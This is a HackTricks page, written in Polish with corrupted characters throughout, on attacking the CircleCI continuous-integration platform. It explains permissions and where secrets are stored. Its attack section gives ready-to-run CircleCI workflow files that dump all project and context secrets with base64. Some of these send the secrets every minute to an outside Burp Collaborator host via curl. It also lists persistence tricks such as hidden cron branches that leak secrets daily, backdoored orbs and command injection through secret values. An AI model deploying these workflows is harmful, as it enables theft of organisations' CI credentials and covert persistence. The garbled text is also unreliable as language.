# CircleCI Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Basic Information

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) to platforma cigej integracji, na kt贸rej mo偶esz **definiowa szablony** wskazujce, co chcesz, aby zrobia z kodem i kiedy to zrobi. W ten spos贸b mo偶esz **automatyzowa testowanie** lub **wdro偶enia** bezporednio **z g贸wnej gazi repozytorium** na przykad.

### Permissions

**CircleCI** **dziedziczy uprawnienia** z github i bitbucket zwizane z **konto**, kt贸re si loguje.\
W moich testach sprawdziem, 偶e tak dugo, jak masz **uprawnienia do zapisu w repozytorium na githubie**, bdziesz m贸g **zarzdza ustawieniami projektu w CircleCI** (ustawia nowe klucze ssh, uzyskiwa klucze api projektu, tworzy nowe gazie z nowymi konfiguracjami CircleCI...).

Jednak musisz by **administratorem repozytorium**, aby **przeksztaci repozytorium w projekt CircleCI**.

### Env Variables & Secrets

Zgodnie z [**dokumentacj**](https://circleci.com/docs/2.0/env-vars/) istniej r贸偶ne sposoby **adowania wartoci do zmiennych rodowiskowych** w ramach workflow.

#### Built-in env variables

Ka偶dy kontener uruchamiany przez CircleCI zawsze bdzie mia [**specyficzne zmienne rodowiskowe zdefiniowane w dokumentacji**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) takie jak `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` lub `CIRCLE_USERNAME`.

#### Clear text

Mo偶esz je zadeklarowa w postaci jawnego tekstu wewntrz **komendy**:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Mo偶esz zadeklarowa je w czystym tekcie wewntrz **rodowiska uruchomieniowego**:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Mo偶esz zadeklarowa je w czystym tekcie wewntrz **build-job environment**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Mo偶esz zadeklarowa je w czystym tekcie wewntrz **rodowiska kontenera**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
#### Sekrety projektu

To s **sekrety**, kt贸re bd **dostpne** tylko dla **projektu** (dla **ka偶dej gazi**).\
Mo偶esz je zobaczy **zadeklarowane w** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
Funkcjonalno "**Import Variables**" pozwala na **importowanie zmiennych z innych projekt贸w** do tego.
{% endhint %}

#### Sekrety kontekstu

To s sekrety, kt贸re s **og贸lnodostpne w organizacji**. Domylnie **ka偶de repo** bdzie mogo **uzyska dostp do ka偶dego sekretu** przechowywanego tutaj:

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
Nale偶y jednak zauwa偶y, 偶e mo偶na **wybra inn grup** (zamiast wszystkich czonk贸w), aby **przyzna dostp do sekret贸w tylko wybranym osobom**.\
To jest obecnie jeden z najlepszych sposob贸w na **zwikszenie bezpieczestwa sekret贸w**, aby nie pozwala wszystkim na ich dostp, ale tylko niekt贸rym osobom.
{% endhint %}

### Ataki

#### Wyszukiwanie sekret贸w w czystym tekcie

Jeli masz **dostp do VCS** (takiego jak github), sprawd藕 plik `.circleci/config.yml` w **ka偶dym repo na ka偶dej gazi** i **wyszukaj** potencjalne **sekrety w czystym tekcie** przechowywane tam.

#### Wyliczanie zmiennych rodowiskowych sekret贸w i kontekstu

Sprawdzajc kod, mo偶esz znale藕 **wszystkie nazwy sekret贸w**, kt贸re s **u偶ywane** w ka偶dym pliku `.circleci/config.yml`. Mo偶esz r贸wnie偶 uzyska **nazwy kontekst贸w** z tych plik贸w lub sprawdzi je w konsoli internetowej: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

#### Ekstrakcja sekret贸w projektu

{% hint style="warning" %}
Aby **ekstrahowa WSZYSTKIE** sekrety projektu i kontekstu, **wystarczy** mie **dostp do ZAPISU** do **tylko 1 repo** w caej organizacji github (_a twoje konto musi mie dostp do kontekst贸w, ale domylnie ka偶dy mo偶e uzyska dostp do ka偶dego kontekstu_).
{% endhint %}

{% hint style="danger" %}
Funkcjonalno "**Import Variables**" pozwala na **importowanie zmiennych z innych projekt贸w** do tego. Dlatego atakujcy m贸gby **zaimportowa wszystkie zmienne projektu ze wszystkich repo** i nastpnie **ekstrahowa je wszystkie razem**.
{% endhint %}

Wszystkie sekrety projektu s zawsze ustawione w zmiennych rodowiskowych zada, wic wystarczy wywoa env i obfuscowa to w base64, aby ekstrahowa sekrety w **konsoli log贸w internetowych workflow**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Jeli **nie masz dostpu do konsoli internetowej**, ale masz **dostp do repozytorium** i wiesz, 偶e u偶ywany jest CircleCI, mo偶esz po prostu **utworzy workflow**, kt贸ry jest **wyzwalany co minut** i **eksfiltruje sekrety do zewntrznego adresu**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
#### Ekstrahowa sekrety kontekstu

Musisz **okreli nazw kontekstu** (to r贸wnie偶 ekstrahuje sekrety projektu):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Jeli **nie masz dostpu do konsoli internetowej**, ale masz **dostp do repozytorium** i wiesz, 偶e u偶ywany jest CircleCI, mo偶esz po prostu **zmodyfikowa workflow**, kt贸ry jest **wyzwalany co minut** i kt贸ry **wykrada sekrety do zewntrznego adresu**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Po prostu utworzenie nowego `.circleci/config.yml` w repozytorium **nie wystarczy, aby uruchomi budow w circleci**. Musisz **wczy to jako projekt w konsoli circleci**.
{% endhint %}

#### Ucieczka do Chmury

**CircleCI** daje Ci mo偶liwo uruchamiania **swoich bud贸w na ich maszynach lub na wasnych**.\
Domylnie ich maszyny znajduj si w GCP, a pocztkowo nie bdziesz w stanie znale藕 niczego istotnego. Jednak jeli ofiara uruchamia zadania na **swoich wasnych maszynach (potencjalnie w rodowisku chmurowym)**, mo偶esz znale藕 **punkt kocowy metadanych chmury z interesujcymi informacjami**.

Zauwa偶, 偶e w poprzednich przykadach wszystko uruchamiano wewntrz kontenera docker, ale mo偶esz r贸wnie偶 **poprosi o uruchomienie maszyny wirtualnej** (kt贸ra mo偶e mie r贸偶ne uprawnienia chmurowe):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Lub nawet kontener docker z dostpem do zdalnej usugi docker:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
#### Persistence

* Mo偶liwe jest **tworzenie** **token贸w u偶ytkownik贸w w CircleCI** do uzyskania dostpu do punkt贸w kocowych API z dostpem u偶ytkownik贸w.
* _https://app.circleci.com/settings/user/tokens_
* Mo偶liwe jest **tworzenie token贸w projekt贸w** do uzyskania dostpu do projektu z uprawnieniami nadanymi tokenowi.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Mo偶liwe jest **dodawanie kluczy SSH** do projekt贸w.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Mo偶liwe jest **tworzenie zadania cron w ukrytej gazi** w nieoczekiwanym projekcie, kt贸re **wycieka** wszystkie **zmienne rodowiskowe kontekstu** codziennie.
* Lub nawet stworzenie w gazi / modyfikacja znanego zadania, kt贸re bdzie **wycieka** wszystkie sekrety **kontekstu** i **projekt贸w** codziennie.
* Jeli jeste wacicielem githuba, mo偶esz **zezwoli na niezaufane orbsy** i skonfigurowa jeden w zadaniu jako **tyln furtk**.
* Mo偶esz znale藕 **luk w wstrzykiwaniu polece** w niekt贸rych zadaniach i **wstrzykn polecenia** za pomoc **sekretu**, modyfikujc jego warto.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
